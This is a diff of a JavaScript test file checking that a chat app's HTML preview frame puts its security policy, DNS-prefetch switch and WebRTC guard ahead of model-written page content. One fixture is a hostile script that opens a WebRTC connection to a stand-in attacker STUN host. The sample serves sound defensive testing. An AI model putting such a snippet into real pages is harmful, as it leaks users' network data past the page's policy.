@@ -119,10 +119,13 @@ test("the policy also declares CSP3's WebRTC switch, which applies the day a bro
   assert.deepEqual(directives["webrtc"], ["'block'"]);
 });
 
-test("the WebRTC guard runs right after our policy and before anything the page says", () => {
+test("the WebRTC guard runs right after our policy and the DNS-prefetch switch, before anything the page says", () => {
   const hostile = `<script>new RTCPeerConnection({ iceServers: [{ urls: "stun:attacker.example:3478" }] })</script>`;
   const { inner } = split(buildHtmlPreviewSrcdoc(hostile));
-  const head = `<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`;
+  // CSP meta, then the DNS-prefetch meta, then the guard, then the page.
+  const head =
+    `<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">` +
+    `<meta http-equiv="x-dns-prefetch-control" content="off">`;
   assert.ok(inner.startsWith(`${head}<script>${HTML_PREVIEW_GUARD_SCRIPT}</script>`));
   assert.ok(inner.endsWith(hostile));
   assert.ok(inner.indexOf(HTML_PREVIEW_GUARD_SCRIPT) < inner.indexOf("new RTCPeerConnection"));
@@ -266,17 +269,25 @@ test("the frame switches off DNS prefetching ahead of the page, after our policy
 // HTML is bypassed; they are a known residual risk, covered by the frame's own policy
 // and x-dns-prefetch-control only.
 test("the parent document never parses or rewrites the model's HTML for resource hints", () => {
-  const panel = readFileSync(new URL("../components/chat/HtmlArtifactPreviewPanel.tsx", import.meta.url), "utf8");
-  const lib = readFileSync(new URL("../lib/htmlArtifactPreview.ts", import.meta.url), "utf8");
-  assert.ok(!panel.includes("stripPreviewResourceHints") && !lib.includes("stripPreviewResourceHints"));
+  const read = (path) => readFileSync(new URL(path, import.meta.url), "utf8");
+  // The panel draws the frame through HtmlArtifactPreviewFrame, which builds the srcdoc.
+  const panel = read("../components/chat/HtmlArtifactPreviewPanel.tsx");
+  const frame = read("../components/chat/HtmlArtifactPreviewFrame.tsx");
+  const lib = read("../lib/htmlArtifactPreview.ts");
+  // Code only: a comment that names an API is not a use of it.
+  const code = (source) => source.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
+  for (const source of [panel, frame, lib]) assert.ok(!source.includes("stripPreviewResourceHints"));
   assert.ok(!lib.includes("RESOURCE_HINT_SELECTOR"));
   // The one parse that remains is the embedder-nonce rewrite, which existed before and runs only when
   // the embedding document has a nonce; nothing else touches the page as markup.
-  assert.equal(panel.split("new DOMParser()").length - 1, 1);
-  assert.ok(panel.includes("withEmbedderNonce(html, nonce, (text) => new DOMParser()"));
-  for (const source of [panel, lib]) {
-    assert.doesNotMatch(source, /innerHTML|insertAdjacentHTML|document\.write|createContextualFragment/);
+  assert.equal((panel + frame).split("new DOMParser()").length - 1, 1);
+  assert.ok(frame.includes("withEmbedderNonce(html, nonce, (text) => new DOMParser()"));
+  for (const source of [panel, frame, lib]) {
+    assert.doesNotMatch(code(source), /innerHTML|insertAdjacentHTML|document\.write|createContextualFragment/);
   }
-  // No pattern over the page's markup in the build step either: the page is carried as written.
+  // No pattern over the page's markup for resource hints in the build step either.
   assert.doesNotMatch(lib, /\.replace\([^)]*<link/i);
+  // The one text substitution over the page is the declarative-shadow-root rename (no parse), made where the
+  // frame is built.
+  assert.equal(code(lib).split("neutralizeDeclarativeShadowRoots(html.replace(LEADING_DOCTYPE").length - 1, 1);
 });
